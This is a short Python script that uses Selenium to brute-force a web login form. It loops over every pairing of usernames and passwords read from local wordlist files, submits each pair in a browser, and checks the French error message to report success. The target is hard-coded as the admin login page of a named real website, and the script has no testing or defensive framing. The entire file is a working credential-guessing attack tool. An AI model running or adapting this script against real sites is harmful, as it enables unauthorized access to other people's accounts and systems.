import os
import pickle
from time import sleep
import regex as re
from selenium import webdriver
from bs4 import BeautifulSoup
from selenium.webdriver.common.by import By
from selenium.webdriver.remote.webelement import WebElement

f = open("repertoire.txt", "rb")
userdata = pickle.load(f)
f.close()
options = webdriver.ChromeOptions()
options.add_argument("--user-data-dir=" + userdata)


def try_one_login(url, login, passwd, cssl, cssp, cssb):
    driver = webdriver.Chrome("C:/chromedriver.exe", options=options)
    driver.get(url)
    sleep(3)
    username = driver.find_element(By.ID, cssl);
    password = driver.find_element(By.ID, cssp);
    username.send_keys(login);
    password.send_keys(passwd);
    login = driver.find_element(By.NAME, cssb);
    login.click();
    answer = driver.find_element(By.XPATH, "/html/body/p");
    print(answer.text)
    if (answer.text == "Identifiants incorrect !"):
        print("echec...")
    else:
        print("success!")
    driver.close()


def mainloop(url, selecteur_login, selecteur_password, selecteur_bouton, password_list, login_list):
    i = 0
    with open(os.path.realpath(password_list)) as passwords:
        for password in passwords.readlines():
            with open(os.path.realpath(login_list)) as logins:
                for login in logins.readlines():
                    i += 1
                    l = login.replace("\n", "")
                    p = password.replace("\n", "")
                    # try_one_login(url, "loginTrial", "passwordTrial", "login", "password", "submit")
                    try_one_login(url, l, p, selecteur_login,
                                  selecteur_password, selecteur_bouton)
                    print(str(i) + ") With login: " + l + " and password: " + p)
                    # sleep(2)


passwordsL = "C:/Users/user/Videos/pass.txt"
loginsL = "C:/Users/user/Videos/log.txt"
url = "https://www.alljudo.net/admin/login.php"
mainloop(url, "login", "password", "submit", passwordsL, loginsL)
# try_one_login(url, "loginTrial", "passwordTrial", "login", "password", "submit")
